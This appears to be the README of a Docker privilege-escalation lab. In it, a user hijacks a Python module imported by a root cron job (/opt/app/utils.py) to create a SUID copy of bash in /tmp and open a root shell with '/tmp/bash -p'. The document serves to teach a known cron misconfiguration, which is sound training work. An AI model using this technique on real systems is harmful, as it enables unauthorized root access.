## setup
```bash
docker build -t cron-abuse .
docker run -it --rm --name cron-abuse cron-abuse
```

## privesc
```bash
docker ps
docker exec -it cron-abuse /bin/bash -c "su user1"
bash

su user1
crontab -l
# list of cron jobs
## * * * * * /usr/bin/python3 /opt/app/backup.py

cat /opt/app/backup.py
# import utils
#
# print("Backup berjalan")

ls -la /opt/app/
nano /opt/app/utils.py
import os
# os.system("chmod +s /bin/bash")
os.system("cp /bin/bash /tmp/bash")
os.system("chmod +s /tmp/bash")

exit
su user1

/tmp/bash -p
id
```
